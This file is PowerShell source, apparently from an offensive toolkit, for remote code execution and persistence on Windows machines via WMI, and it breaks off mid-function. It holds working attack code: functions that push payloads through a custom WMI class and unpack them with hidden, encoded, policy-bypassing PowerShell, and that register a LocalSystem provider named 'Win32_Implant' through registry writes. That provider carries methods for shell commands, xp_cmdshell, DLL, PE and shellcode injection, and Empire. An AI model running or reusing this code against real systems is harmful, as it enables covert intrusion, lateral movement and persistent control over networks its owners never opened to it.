#$pass = ConvertTo-SecureString "Password" -AsPlainText -Force
#$credential = New-Object System.Management.Automation.PSCredential (“username”, $pass)

#region DuplicateWMIClass
################################################################################
# Creates a connection to a specified WMI class
# Tested - Working
################################################################################
Function local:New-WMIConnection {
    <#
	.SYNOPSIS

	.PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
    .PARAMETER NameSpace
        WMI Name Space to connect to. Defaults to ROOT\cimv2.
    .PARAMETER TargetClassName
        WMI class to connect to.
    .PARAMETER Username
        Username used to authenticate to remote WMI service.
    .PARAMETER Password
        Password stored as a SecureString object to authenticate to remote WMI service.
    .PARAMETER SecurePassword
        Password stored as a SecureString object to authenticate to remote WMI service.
    .PARAMETER Credential
	    Credential object used authenticate to remote WMI service.
	.EXAMPLE
        $ManagementClass = New-WMIConnection -TargetClassName Win32_Process -ComputerName $ComputerName -Credential $Credential
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [String]$ComputerName = ".",
        [Parameter(Mandatory=$False, HelpMessage="WMI Name Space to connect to. Defaults to ROOT\cimv2.")]
            [string]$NameSpace = "ROOT\cimv2",

        [Parameter(Mandatory=$False, HelpMessage="Username used to authenticate to remote WMI service.")]
            [string]$Username,
        [Parameter(Mandatory=$False, HelpMessage="Password used to authenticate to remote WMI service.")]
            [string]$Password,
        [Parameter(Mandatory=$False, HelpMessage="Password stored as a SecureString object to authenticate to remote WMI service.")]
            [SecureString]$SecurePassword,
        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$False, HelpMessage="WMI class to connect to.")]
            [string]$TargetClassName = [String]::Empty
    )
    $ConnectionOptions = New-Object System.Management.ConnectionOptions;
    if ($Username) {
        if ($Password)
        {
            [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
        } 
        $ConnectionOptions.Username = $Username
        $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
        Write-Verbose "Authenticating as $Username"
    } elseif ($Credential) {
        $ConnectionOptions.Username = $Credential.UserName
        $ConnectionOptions.SecurePassword = [SecureString]$Credential.Password
        Write-Verbose "Authenticating as $($Credential.UserName)"
    } else {
        $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
    }
    Write-Verbose "Connecting to \\$ComputerName\$NameSpace"
    $ManagementScope = New-Object System.Management.ManagementScope("\\$ComputerName\$NameSpace", $ConnectionOptions);
    $ManagementScope.Connect()
    if ( -not $ManagementScope.IsConnected) {
        Write-Warning "Connection Failed"
        return $null
    } else {
        Write-Verbose "Connected to \\$ComputerName\$NameSpace"
        return New-Object System.Management.ManagementClass($ManagementScope, $TargetClassName, $null);
    }
}

################################################################################
# Duplicates an existing WMI class
# Tested - Working
################################################################################
Function Invoke-WMIDuplicateClass {
    <#
	.SYNOPSIS

	.PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
    .PARAMETER NameSpace
        Namespace to connect to.
    .PARAMETER TargetClassName
        Source class to duplicate.
    .PARAMETER DuplicateClassName
        Destincaiton class to create.
    .PARAMETER Username
        Username used to authenticate to remote WMI service.
    .PARAMETER Password
        Password used to authenticated to remote WMI service
    .PARAMETER SecurePassword
        Password stored as a SecureString object to authenticate to remote WMI service.
    .PARAMETER Credential
	    Credential object used authenticate to remote WMI service.
	.EXAMPLE
        Invoke-WMIDuplicateClass -TargetClassName Win32_Process -DuplicateClassName Win32_Duplicate -Computer 192.168.255.240 -Credential $Credential
	    Invoke-WmiMethod -Class Win32_Duplicate -Name Create -ArgumentList "whoami" -ComputerName $ComputerName -Credential $Credential
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$False, HelpMessage="Namespace to connect to.")]
            [string]$NameSpace = "ROOT\cimv2",

        [Parameter(Mandatory=$False, HelpMessage="Source class to duplicate.")]
            [string]$TargetClassName = [String]::Empty,
        [Parameter(Mandatory=$True, HelpMessage="Destincaiton class to create.")]
            [string]$DuplicateClassName,

        [Parameter(Mandatory=$False, HelpMessage="Username used to authenticate to remote WMI service.")]
            [string]$Username,
        [Parameter(Mandatory=$False, HelpMessage="Password used to authenticate to remote WMI service.")]
            [string]$Password,
        [Parameter(Mandatory=$False, HelpMessage="Password stored as a SecureString object to authenticate to remote WMI service.")]
            [SecureString]$SecurePassword,
        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential
    )
    Begin {
        $ManagementClass = New-WMIConnection -ComputerName $ComputerName -NameSpace $NameSpace -Username $Username -Password $Password -SecurePassword $SecurePassword -Credential $Credential -TargetClassName $TargetClassName -Verbose
    } Process {
        $NewManagementClass = $ManagementClass.Derive($DuplicateClassName)
        $Output = $NewManagementClass.put()
        if ($Output.IsClass) {
            Write-Verbose "Created \\$ComputerName\($NameSpace):$DuplicateClassName"
        }
    } End {
        Write-Output $output
    }
}
#endregion

#region WMIProvider
################################################################################
# Let's get the file over there
################################################################################
Function Invoke-WMIUpload {
<#
	.SYNOPSIS
	Creates a static WMI class on the target system, reads in and base64 encodes 
    the file, splits the base64 encoding strings, inserts the string into the 
    WMI class, extracts the remote strings and reassmbles the file, and writes 
    it to a specified location.
	.PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
    .PARAMETER PayloadPath
     
    .PARAMETER PayloadName

    .PARAMETER ClassName

    .PARAMETER PayloadName

    .PARAMETER Destination

    .PARAMETER Credential
	    Credential object used authenticate to remote WMI service.
	.EXAMPLE
	
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$True, HelpMessage="File to upload.")]
            [string]$PayloadPath,
        [Parameter(Mandatory=$False, HelpMessage="Label for file in WMI.")]
            [string]$PayloadName = $PayloadPath,
        [Parameter(Mandatory=$False, HelpMessage="System to run against.")]
            [string]$ClassName = "WMIFS",
        [Parameter(Mandatory=$False, HelpMessage="Location on remote file system to place extracted file.")]
            [string]$Destination = "$env:windir\system32\wbem\",
        [Parameter(Mandatory=$False, HelpMessage="Prepare file for memory injection, don't write file to disk.")]
            [switch]$Inject
    )
    Begin {
    } Process {
        $null = New-WMIFSClass -ClassName $ClassName -ComputerName $ComputerName -Username $Credential.UserName -SecurePassword $Credential.Password -Verbose
        $EncodedText = ConvertTo-Base64 -FileName $PayloadPath -Inject $Inject -Verbose
        Invoke-InsertFileThreaded -EncodedText $EncodedText -FileName $PayloadName -ClassName $ClassName -StrLen 8000 -ComputerName $ComputerName -Credential $Credential -Verbose   
        if (-not $Inject) {
            Invoke-WMIRemoteExtract -PayloadName $PayloadName -ClassName $ClassName -Destination $Destination -ComputerName $ComputerName -Credential $Credential -ShowCommand -Verbose
        }
    } End {
    }
}

################################################################################
# Extract file remotely
################################################################################
Function Invoke-WMIRemoteExtract {
<#
	.SYNOPSIS
	    Remotely extracts a file stored in WMI and writes it out to disk.
	.PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
    .PARAMETER Credential
        Credential object used authenticate to remote WMI service.
    .PARAMETER PayloadName
        The name of the file in WMIFS.
    .PARAMETER ClassName
        The name of the class that the file is stored in.
    .PARAMETER Destination
	    The location where to file is to be written out to.
    .PARAMETER NoWait
        Do not wait for the WMI extraction to finish before returning.
    .PARAMETER ShowCommand
        Display command to be executed. Use with -Verbose.
	.EXAMPLE
        Invoke-WMIRemoteExtract -PayloadName $PayloadName -ClassName $ClassName -Destination $Destination -ComputerName $ComputerName -Credential $Credential -ShowCommand -Verbose
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$True, HelpMessage="Name of payload to extract.")]
            [string]$PayloadName,
        [Parameter(Mandatory=$False, HelpMessage="Class where payload is stored.")]
            [string]$ClassName = "WMIFS",
        [Parameter(Mandatory=$True, HelpMessage="Location on remote file system to place extracted file.")]
            [string]$Destination = "$env:windir\system32\wbem\",
        [Parameter(Mandatory=$False, HelpMessage="Do not wait for extract to finish before returning.")]
            [switch]$NoWait,
        [Parameter(Mandatory=$False, HelpMessage="Display command to be executed. Use with -Verbose.")]
            [switch]$ShowCommand
    )
    Begin {
        $InvokeRetrieveFile = "Function Invoke-RetrieveFile {" + (Get-Command Invoke-RetrieveFile).Definition + "}"
        $ConvertFromBase64 = "Function ConvertFrom-Base64 {" + (Get-Command ConvertFrom-Base64).Definition + "}"
        $Command1 = "`$File = Invoke-RetrieveFile -FileName $PayloadName -ClassName $ClassName -Verbose"
        $Command2 = "ConvertFrom-Base64 -WriteToDisk -EncodedText `$File -FileName $Destination\$PayloadName -Verbose"
        $Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$InvokeRetrieveFile; $ConvertFromBase64; $Command1; $Command2;"))
        $RemoteCommand = "powershell.exe -NoP -NonI -Win Hidden -Exe Bypass -Enc $Base64"
    } Process { 
        $Process = Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -ComputerName $ComputerName -Credential $Credential
        if ($ShowCommand) {
            Write-Verbose $RemoteCommand
        }
    } End { 
        if (-not $NoWait -and $Process) {
            While (Get-WmiObject -Class Win32_Process -Filter "ProcessId = '$($Process.ProcessId)'" -ComputerName $ComputerName -Credential $credential) {
                Write-Verbose "Waiting for remote extract to finish: ($($Process.ProcessId))."
                Start-Sleep 2
            }
        }
    }
}

################################################################################
# Extract file remotely
# Tested - Working
################################################################################
Function Install-WMIProviderInstallUtil {
<#
	.SYNOPSIS
	    Installs a WMI Provider using InstallUtil.exe
	.PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
    .PARAMETER Credential
        Credential object used authenticate to remote WMI service.
    .PARAMETER RemoteLibraryLocation
	    Location where the provider dll is installed.
    .PARAMETER ShowCommand
        Display command to be executed. Use with -Verbose.
	.EXAMPLE
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$True, HelpMessage="System to run against.")]
            [string]$RemoteLibraryLocation,
        [Parameter(Mandatory=$False, HelpMessage="Display command to be executed. Use with -Verbose.")]
            [switch]$ShowCommand
    )
    Begin {
        $RemoteCommand = "&([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()+`"\InstallUtil.exe`") /LogToConsole=false /LogFile $RemoteLibraryLocation"
        $Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$RemoteCommand;"))
        $RemoteCommand = "powershell.exe -NoP -NonI -Win Hidden -Exe Bypass -Enc $Base64"
        if ($ShowCommand) {
            Write-Verbose "$RemoteCommand"
        }
    } Process {
        $Output = Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -ComputerName $ComputerName -Credential $Credential
    } End { 
        Write-Output $Output
    }
}

################################################################################
# Extract file remotely
# Tested - Not working as one liner, unable to find type
################################################################################
Function Install-WMIProviderPowerShell {
<#
	.SYNOPSIS
	    Installs a WMI Provider using the .Net ManagedInstallerClass.
	.PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
    .PARAMETER Credential
        Credential object used authenticate to remote WMI service.
    .PARAMETER RemoteLibraryLocation
        Location where the provider dll is installed.
    .PARAMETER ShowCommand
        Display command to be executed. Use with -Verbose.
	.EXAMPLE
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$True, HelpMessage="Location where the provider dll is installed.")]
            [string]$RemoteLibraryLocation,
        [Parameter(Mandatory=$False, HelpMessage="Display command to be executed. Use with -Verbose.")]
            [switch]$ShowCommand
    )
    Begin {
        #$RemoteCommand = "`"Add-Type -AssemblyName System.Configuration.Install; `"+[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@('$LibraryLocation'))"
        $RemoteCommand = "[System.Configuration.Install.ManagedInstallerClass]::InstallHelper(@('$RemoteLibraryLocation'))"
        $Base64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$RemoteCommand;"))
        $RemoteCommand = "powershell.exe -NoP -NonI -Win Hidden -Exe Bypass -Enc $Base64"
        if ($ShowCommand) {
            Write-Verbose "$RemoteCommand"
        }
    } Process {
        $Output = Invoke-WmiMethod -Namespace "root\cimv2" -Class Win32_Process -Name Create -ArgumentList $RemoteCommand -Credential $Credential -ComputerName $ComputerName
    } End { 
        Write-Verbose $Output
    }
}

################################################################################
# Register WMI Provider Method
# Tested - Working
################################################################################
Function Install-WMIProviderExtention {
<#
	.SYNOPSIS
	    Installs the WMI Provider as an extention in ROOT/cimv2/WMI_extension.
        This is a considerably simpler install process.
	.PARAMETER ComputerName
        Address of the system to connect to. Defaults to localhost.
    .PARAMETER Username
        Username used to authenticate to remote WMI service.
        Not required for pass-through authentication.
    .PARAMETER Password
        Password used to authenticated to remote WMI service
        Not required for pass-through authentication.
    .PARAMETER SecurePassword
        Password stored as a SecureString object to authenticate to remote WMI service. 
        Not required for pass-through authentication.
    .PARAMETER Credential
        Credential object used authenticate to remote WMI service.
        Not required for pass-through authentication.
    .PARAMETER ProviderDisplayName
        Name of WMI class to install on remote system.
    .PARAMETER LibraryClassName
        Library class name to use in the provider information.
    .PARAMETER CLRVersion
        Provider clr version.
    .PARAMETER dotNetVersion
        Remote dotNet runtime version to use.
    .PARAMETER PublicKeyToken
        Public key token of the signed library.
    .PARAMETER HostingModel
        WMI hosting model - This is service account to use.
    .PARAMETER uri
        Public key token of the signed library.
    .PARAMETER RemoteLibraryLocation
	    Location where the provider dll is installed.
    .PARAMETER LocalLibraryLocation
	    Local location where the provider dll is located that can be used to parse information.
	.EXAMPLE

#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$False, HelpMessage="WMI Namespace to install .")]
            [string]$NameSpace = "ROOT\cimv2",
	    
        [Parameter(Mandatory=$False, HelpMessage="Username used to authenticate to remote WMI service.")]
            [string]$Username,
        [Parameter(Mandatory=$False, HelpMessage="Password used to authenticate to remote WMI service.")]
            [string]$Password,
        [Parameter(Mandatory=$False, HelpMessage="Password stored as a SecureString object to authenticate to remote WMI service.")]
            [SecureString]$SecurePassword,
        [Parameter(Mandatory=$False, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$False, HelpMessage="WMI class name to install e.g. Win32_Implant.")]
            [string]$ProviderDisplayName = "Win32_Implant",
        [Parameter(Mandatory=$False, HelpMessage="Library class name to use in the provider information.")]
            [string]$LibraryClassName,
        [Parameter(Mandatory=$False, HelpMessage="Provider clr version.")]
            [ValidateSet ("v2.0.50727", "v4.0.30319")]
            [string]$RuntimeVersion = "v4.0.30319",
        [Parameter(Mandatory=$False, HelpMessage="Remote dotNet runtime version to use.")]
            [ValidateSet("2.0.0.0", "3.5.0.0", "4.0.0.0")] 
            [string]$dotNetVersion = "4.0.0.0",
        [Parameter(Mandatory=$False, HelpMessage="Public key token of the signed library.")]
            [string]$PublicKeyToken,
        [Parameter(Mandatory=$False, HelpMessage="WMI hosting model - This is service account to use.")]
            [ValidateSet("NetworkServiceHost:CLR", "LocalServiceHost:CLR", "LocalSystemHost:CLR")]
            [string]$HostingModel = "LocalSystemHost:CLR",

        [Parameter(Mandatory=$False, HelpMessage=".")]
            [string]$uri = "file:///",
        [Parameter(Mandatory=$False, HelpMessage="Location where the provider dll is installed.")]
            [string]$RemoteLibraryLocation = "$env:windir\system32\wbem\$ClassName.dll",
        [Parameter(Mandatory=$False, HelpMessage="Local location to read file parameters from. This can replace -Provider, -ClassName, and -RunTimeVersion.")]
            [string]$LocalLibraryLocation = "$env:windir\system32\wbem\$ClassName.dll"
    )
    Begin {
        if ($LocalLibraryLocation) {
            $File = [System.Reflection.Assembly]::LoadFile($LocalLibraryLocation)
            $Provider = $File.FullName
            Write-Verbose "$Provider"
            $ClassName = $File.Evidence.Name
            $RuntimeVersion = $File.ImageRuntimeVersion
        } else {
            $Provider = "$ClassName, Version=1.0.0.0, Culture=neutral, PublicKeyToken=$PublicKeyToken";

        }
        
        $ManagedCommonProviderGuid = [System.Guid]::New("2A7B042D-578A-4366-9A3D-154C0498458E");
        $Guid = $ManagedCommonProviderGuid;
        Write-Verbose "Using GUID $Guid"

        [UInt32]$hkcr = 2147483648
        [UInt32]$hklm = 2147483650

        [string[]]$hkcr_keys = @("CLSID\{$Guid}", "WOW6432Node\CLSID\{$Guid}")
        [string[]]$hklm_keys = @("SOFTWARE\Classes\CLSID\{$Guid}", "SOFTWARE\Classes\WOW6432Node\CLSID\{$Guid}", "SOFTWARE\WOW6432Node\Classes\CLSID\{$Guid}")

        ################################################################################
        # Connect to the WMI Service
        ################################################################################
        $ConnectionOptions = New-Object System.Management.ConnectionOptions;
        if ($Username) {
            if ($Password)
            {
                [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
            } 
            $ConnectionOptions.Username = $Username
            $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
	    Write-Verbose "Authenticating as $Username"
        } elseif ($Credential) {
            $ConnectionOptions.Username = $Credential.UserName
            $ConnectionOptions.SecurePassword = [SecureString]$Credential.Password
            Write-Verbose "Authenticating as $($Credential.UserName)"
        } else {
            Write-Verbose "Authenticating as $env:USERNAME"
            $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
        }
	
	if (-not $Credential) {
            $Credential = New-Object pscredential($Username, $SecurePassword)
        }

        Write-Verbose "Connecting to \\$ComputerName\$NameSpace"
        $ManagementScope = New-Object System.Management.ManagementScope("\\$ComputerName\$NameSpace", $ConnectionOptions);
        $ManagementScope.Connect()
    } Process {
	Invoke-ExtensionProviderSetup -Scope $ManagementScope -Guid $Guid -Provider $Provider -RemoteLibraryLocation $RemoteLibraryLocation -HostingModel $HostingModel -ComputerName $ComputerName -Credential $Credential -Verbose

	Write-Verbose "Registering Win32_Implant"
        $Class = New-Object System.Management.ManagementClass($ManagementScope, [String]::Empty, $null)
        $Class['__class'] = $ProviderDisplayName
        $Class.Qualifiers.Add("dynamic", $true, $false, $true, $false, $true)
        $Class.Qualifiers.Add("provider", $Provider, $false, $false, $false, $true)
        Add-WMIMethodRunCMD -Class $([ref] $Class)
        Add-WMIMethodRunPowerShell -Class $([ref] $Class)
        Add-WMIMethodRunXpCmdShell -Class $([ref] $Class)
        Add-WMIMethodInjectDll -Class $([ref] $Class)
        Add-WMIMethodInjectDllWMIFS -Class $([ref] $Class)
        Add-WMIMethodInjectPeFile -Class $([ref] $Class)
        Add-WMIMethodInjectPeString -Class $([ref] $Class)
        Add-WMIMethodInjectPeWMIFS -Class $([ref] $Class)
        Add-WMIMethodInjectShellCode -Class $([ref] $Class)
        Add-WMIMethodInjectShellCodeWMFIFSB4 -Class $([ref] $Class)
        Add-WMIMethodEmpire -Class $([ref] $Class)
        $null = $Class.put()
	    
        <#
	    Invoke-WMICreateExtensionKeysAndValues -hDefKey $hkcr -sSubKeyName $hkcr_keys -ComputerName $ComputerName -Credential $Credential
        Invoke-WMICreateExtensionKeysAndValues -hDefKey $hklm -sSubKeyName $hklm_keys -ComputerName $ComputerName -Credential $Credential
        #>

        $ScriptBlock = {
            Write-Verbose ("Creating Key: {0}:{1}" -f ($hive, $_))
            Invoke-WMICreateExtensionKeysAndValues -hDefKey $hive -sSubKeyName $_ -ComputerName $ComputerName -Credential $Credential
        }

        $hive = $hkcr
        $hkcr_keys | Invoke-Parallel -ImportVariables -ScriptBlock $ScriptBlock -ImportFunctions
        $hive = $hklm
        $hklm_keys | Invoke-Parallel -ImportVariables -ScriptBlock $ScriptBlock -ImportFunctions

    } End {

    }
}


################################################################################
################################################################################
Function Uninstall-WMIProviderExtention {
<#
	.SYNOPSIS
	    Installs the WMI Provider as an extention in ROOT/cimv2/WMI_extension.
        This is a considerably simpler install process.
    .EXAMPLE
        
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$False, HelpMessage="WMI namespace to install the WMI class in.")]
            [string]$NameSpace = "ROOT\cimv2",
        [Parameter(Mandatory=$True, HelpMessage="The name of the WMI provider to remove.")]
            [string]$ProviderName,
        [Parameter(Mandatory=$True, HelpMessage="The name of the WMI class to remove.")]
            [string]$ClassName
    )
    Begin {
        $ManagedCommonProviderGuid = [System.Guid]::New("2A7B042D-578A-4366-9A3D-154C0498458E");
        Write-Verbose "Using GUID $ManagedCommonProviderGuid"

        [UInt32]$hkcr = 2147483648
        [UInt32]$hklm = 2147483650

        [string[]]$hkcr_keys = @("CLSID\{$ManagedCommonProviderGuid}", "WOW6432Node\CLSID\{$ManagedCommonProviderGuid}")
        [string[]]$hklm_keys = @("SOFTWARE\Classes\CLSID\{$ManagedCommonProviderGuid}", "SOFTWARE\Classes\WOW6432Node\CLSID\{$ManagedCommonProviderGuid}", "SOFTWARE\WOW6432Node\Classes\CLSID\{$ManagedCommonProviderGuid}")
    } Process {
        Write-Verbose "Removing WMI_extension"
        $null = Get-WmiObject -Class WMI_extension -ComputerName $ComputerName -Credential $Credential | ? Name -Like "*$ProviderName*" | Remove-WmiObject
        Write-Verbose "Removing __InstanceProviderRegistration Instance"
        $null = Get-WmiObject -Class __InstanceProviderRegistration -ComputerName $ComputerName -Credential $Credential | ? Provider -Like "*$AssemblyName*" | Remove-WmiObject
        Write-Verbose "Removing __MethodProviderRegistration Instance"
        $null = Get-WmiObject -Class __MethodProviderRegistration -ComputerName $ComputerName -Credential $Credential | ? Provider -Like "*$AssemblyName*" | Remove-WmiObject
        Write-Verbose "Removing $ClassName"
        Get-WmiObject -Class $ClassName
        <#
        Invoke-WMIDeleteExtensionKeys -hDefKey $hkcr -sSubKeyName $hkcr_keys -ComputerName $ComputerName -Credential $Credential
        Invoke-WMIDeleteExtensionKeys -hDefKey $hklm -sSubKeyName $hklm_keys -ComputerName $ComputerName -Credential $Credential
        #>
    } End {

    }
}

#region StdRegProv Functions
################################################################################
################################################################################
Function Invoke-WmiCreateExtensionKeysAndValues {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,
            
        [Parameter(Mandatory=$true, HelpMessage="The registry hive to access.")]
            [string]$hDefKey,
        [Parameter(Mandatory=$true, HelpMessage="The registry key name to create.")]
            [string[]]$sSubKeyName,
        [Parameter(Mandatory=$False, HelpMessage="Reserved for future use.")]
            [ValidateSet("v2.0.50727", "v4.0.30319")] 
            [string]$CLRVersion = "v4.0.30319",
        [Parameter(Mandatory=$False, HelpMessage="Reserved for future use.")]
            [ValidateSet("2.0.0.0", "3.5.0.0", "4.0.0.0")] 
            [string]$dotNetVersion = "4.0.0.0"
    )
    Begin {
        $RegistryProvider = "System.Management.Instrumentation, Version=$dotNetVersion, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        $DllProvider = "C:\Windows\System32\mscoree.dll"
        $DllProviderClass = "System.Management.Instrumentation.ManagedCommonProvider"
    } Process {
        ForEach($key in $sSubKeyName) {
            Write-Verbose "Creating Key $key"
            Invoke-CreateKeyChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key
            Invoke-SetStringValueChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key -sValueName "" -sValue $DllProviderClass

            $key2 = "$key\InprocServer32"
            Invoke-CreateKeyChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key2
            Invoke-SetStringValueChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key2 -sValueName "" -sValue $DllProvider
            Invoke-SetStringValueChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key2 -sValueName "Assembly" -sValue $RegistryProvider
            Invoke-SetStringValueChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key2 -sValueName "Class" -sValue $DllProviderClass
            Invoke-SetStringValueChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key2 -sValueName "RuntimeVersion" -sValue $CLRVersion
            Invoke-SetStringValueChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key2 -sValueName "ThreadingModel" -sValue "Both"

            $key3 = "$key\InprocServer32\4.0.0.0"
            Invoke-CreateKeyChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key3
            Invoke-SetStringValueChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key3 -sValueName "Assembly" -sValue $RegistryProvider
            Invoke-SetStringValueChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key3 -sValueName "Class" -sValue $DllProviderClass
            Invoke-SetStringValueChecked -ComputerName $ComputerName -Credential $Credential -hDefKey $hDefKey -sSubKeyName $key3 -sValueName "RuntimeVersion" -sValue $CLRVersion
        }
    } End {
    }
}

################################################################################
################################################################################
Function local:Invoke-CreateKeyChecked {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$true, HelpMessage="The registry hive to access.")]
            [string]$hDefKey,
        [Parameter(Mandatory=$true, HelpMessage="The registry key name to create.")]
            [string]$sSubKeyName
    )
    $output = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -Class StdRegProv -Name CreateKey -ArgumentList $hDefKey, $sSubKeyName -ErrorAction SilentlyContinue
    if ($output.ReturnValue -ne 0) {
        Write-Warning "Error Creating $($output.ReturnValue) : $hDefKey : $sSubKeyName"
    }
}

################################################################################
################################################################################
Function local:Invoke-SetStringValueChecked {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
            [string]$ComputerName = ".",
        [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
            [PSCredential]$Credential,

        [Parameter(Mandatory=$true, HelpMessage="The registry hive to access.")]
            [string]$hDefKey,
        [Parameter(Mandatory=$true, HelpMessage="The registry key name to create.")]
            [string]$sSubKeyName,
        [Parameter(Mandatory=$false, HelpMessage="The registry key entry to set.")]
            [string]$sValueName = "",
        [Parameter(Mandatory=$true, HelpMessage="The restry entry value to set.")]
            [string]$sValue 
    )
    $output = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -Class StdRegProv -Name SetStringValue -ArgumentList $hDefKey, $sSubKeyName, $sValueName, $sValue -ErrorAction SilentlyContinue
    if ($output.ReturnValue -ne 0) {
        Write-Warning "Error Writing $($output.ReturnValue) : $hDefKey : $sSubKeyName : $sValueName"
    }
}
#endregion

#region ImplantMethodFunctions
################################################################################
# Execute a command prompt command
################################################################################
Function local:Add-WMIMethodRunCMD {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass][ref]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property command -CimType String),
        (New-WMIMethodParameter -Direction In -Property parameters -CimType String)
    )
    Write-Verbose "Creating RunCmd"
    Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName "RunCMD" -MethodInParameters $parameters
}

################################################################################
# Execute a powershell command
################################################################################
Function local:Add-WMIMethodRunPowerShell {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass][ref]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property command -CimType String)
    )
    Write-Verbose "Creating RunPowerShell"
    Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName "RunPowerShell" -MethodInParameters $parameters
}

################################################################################
# Execute a powershell command
################################################################################
Function local:Add-WMIMethodRunXpCmdShell {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
            [System.Management.ManagementClass][ref]$Class
    )
    $parameters = @(
        (New-WMIMethodParameter -Direction In -Property Server -CimType String),
        (New-WMIMethodParameter -Direction In -Property Database -CimType String),
        (New-WMIMethodParameter -Direction In -Property UserName -CimType String),
        (New-WMIMethodParameter -Direction In -Property Password -CimType String),
